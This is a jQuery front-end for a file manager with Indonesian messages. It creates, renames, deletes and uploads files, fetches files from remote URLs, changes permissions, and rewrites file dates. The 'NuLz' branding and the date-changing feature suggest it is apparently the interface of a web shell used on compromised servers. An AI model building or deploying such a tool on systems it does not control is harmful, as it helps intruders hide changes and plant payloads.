$(document).ready(function () {
    //modal
    var modal = $('#NuLzModal');
    function closeModal() {
        $(modal).animate({
            opacity: 0
        }, 300, function () {
            modal.remove();
        });
    }
    $('.close-modal').on('click', function () {
        closeModal();
    });
    $(window).on('click', function (event) {
        if ($(event.target).is(modal)) {
            closeModal();
        }
    });
    //end modal
    //new file
    $('#btn-news-file').on('click', function () {
        $(".news-files").show();
    });
    $('#btn-newfiles').on('click', function () {
        var fileName = $("#newfiles").val();

        if(fileName === "") {
            alert('Mohon Isi Nama File');
        } else {
            $.post('', { action: 'newfiles', fileName: fileName }, function () {
                location.reload();
                $("#newfiles").val("");
            }).fail(function () {
                alert("Terjadi kesalahan dalam mengirimkan permintaan.");
            });
            $("#newfiles").val("");
        }
    });
    //end new file
    //new folder
    $('#btn-news-dir').on('click', function () {
        $(".news-dirs").show();
    });
    $('#btn-newdirs').on('click', function () {
        var dirName = $("#newdirs").val();

        if(dirName === "") {
            alert('Mohon Isi Nama File');
        } else {
            $.post('', { action: 'newdirs', dirName: dirName }, function () {
                location.reload();
                $("#dirName").val("");
            }).fail(function () {
                alert("Terjadi kesalahan dalam mengirimkan permintaan.");
            });
            $("#dirName").val("");
        }
    });
    //end new folder
    //remote upload
    $('#btn-remote-upload').on('click', function () {
        $(".remote-upload").show();
    });
    $('#btn-upload-remote').on('click', function () {
        var fileUrl = $("#fileurl").val();
        var saveName = $("#savename").val();

        if(fileUrl === "") {
            alert('Mohon Isi Dengan Benar!');
        } else if (saveName === "") {
            alert('Mohon Isi Dengan Benar!');
        } else {
            $.post('', { action: 'remote-upload', fileUrl: fileUrl, saveName: saveName }, function () {
                alert('File Uploaded!')
                location.reload();
            }).fail(function () {
                alert("Terjadi kesalahan dalam mengirimkan permintaan.");
            });
        }
    });
    //end remote upload
    //rename
    $('.rename').on('click', function () {
        var oldName = $(this).data('name');
        var newName = prompt("Rename: " + oldName, oldName);
        if (newName) {
            $.post('', { action: 'rename', oldName: oldName, newName: newName }, function () {
                setTimeout(() => {
                    location.reload();
                }, 1000);
            }).fail(function () {
                alert("Terjadi kesalahan dalam mengirimkan permintaan.");
            });
        }
    });
    //end rename
    //change date
    $('.changedate').on('click', function () {
        var itemName = $(this).val();
        var oldDate = $(this).data('date');
        var newDate = prompt("Change Date: " + itemName, oldDate);
        $.post('', { action: 'changedate', itemName: itemName, oldDate: oldDate, newDate: newDate }, function () {
            setTimeout(() => {
                location.reload();
            }, 1000);
        }).fail(function () {
            alert("Terjadi kesalahan dalam mengirimkan permintaan.");
        });
    });
    //end change date
    //permission
    $('.permission').on('click', function () {
        var itemName = $(this).val();
        var oldPerm = $(this).data('perm');
        var newPerm = prompt("Change Permission: " + itemName, oldPerm);
        $.post('', { action: 'permission', itemName: itemName, oldPerm: oldPerm, newPerm: newPerm }, function () {
            setTimeout(() => {
                location.reload();
            }, 1000);
        }).fail(function () {
            alert("Terjadi kesalahan dalam mengirimkan permintaan.");
        });
    });
    //end permission
    //delete dir
    $('.deleteFolder').on('click', function () {
        var folderName = $(this).data('name'); // Ambil nama folder dari data-name

        if (confirm("Apakah Anda yakin ingin menghapus folder " + folderName + "?")) {
            $.post('', { action: 'delete', folderName: folderName }, function () {
                setTimeout(() => {
                    location.reload();
                }, 1000);
            }).fail(function () {
                alert("Terjadi kesalahan dalam mengirimkan permintaan.");
            });
        }
    });
    //end delete dir
    //delete file
    $('.deleteFile').on('click', function () {
        var fileName = $(this).data('name'); // Ambil nama folder dari data-name

        if (confirm("Apakah Anda yakin ingin menghapus file " + fileName + "?")) {
            $.post('', { action: 'delete', fileName: fileName }, function () {
                setTimeout(() => {
                    location.reload();
                }, 1000);
            }).fail(function () {
                alert("Terjadi kesalahan dalam mengirimkan permintaan.");
            });
        }
    });
    //end delete file
    //upload
    $('#nulzup').on('change', function () {
        var formData = new FormData($('#form-upload')[0]);

        $.ajax({
            url: $('#form-upload').attr('action'),
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function () {
                alert('File Uploaded!')
                location.reload();
            },
            error: function () {
                alert('Terjadi kesalahan dalam mengirimkan permintaan.');
            }
        });
    });
    //end upload
});
